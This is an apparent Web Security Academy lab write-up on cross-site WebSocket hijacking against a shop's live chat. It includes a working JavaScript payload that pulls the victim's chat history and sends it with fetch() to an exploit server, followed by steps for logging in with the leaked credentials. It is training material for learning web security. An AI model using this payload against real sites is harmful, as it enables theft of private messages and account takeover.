## Cross-site WebSocket hijacking

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

Note :

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

## Notes

- `/chat`
- WebSocket endpoint: `/chat`
- No CSRF protection on the WebSocket handshake
- WebSocket messages can be replayed cross-origin

## Resume

1. Interact with the live chat
2. Observe WebSocket traffic in Burp Suite
3. Identify the `READY` command used to retrieve chat history
4. Confirm that the WebSocket handshake has no CSRF token
5. Create a malicious WebSocket connection from the exploit server
6. Exfiltrate chat messages to the exploit server
7. Recover victim credentials from leaked messages
8. Log in with victim credentials

## Solve

Open the live chat and send a message.

Reload the page and inspect the WebSocket history in Burp Suite. Notice that the client sends the `READY` command to retrieve previous chat messages.

Inspect the WebSocket handshake request in Burp HTTP history and confirm that no CSRF protection is implemented.

Copy the WebSocket URL and create the following payload on the exploit server:

```html
<script>
  var ws = new WebSocket('wss://0a2800ad047c64df802c038900f60071.web-security-academy.net/chat');

  ws.onopen = function () {
    ws.send("READY");
  };

  ws.onmessage = function (event) {
    fetch(
      'https://exploit-0adf002d0469642a8046026401dc0062.exploit-server.net/?' + event.data,
      { mode: 'no-cors' }
    );
  };
</script>
```

The payload:

- Opens a WebSocket connection to the vulnerable chat endpoint
- Sends the `READY` command to retrieve chat history
- Exfiltrates each received message to the exploit server using `fetch()`

Click **View exploit** and verify that chat messages are successfully leaked to the exploit server.

Deliver the exploit to the victim and monitor incoming requests.

The victim’s chat history is exfiltrated to the exploit server. One of the messages contains the victim user's credentials.

Use the leaked credentials to log in and solve the lab.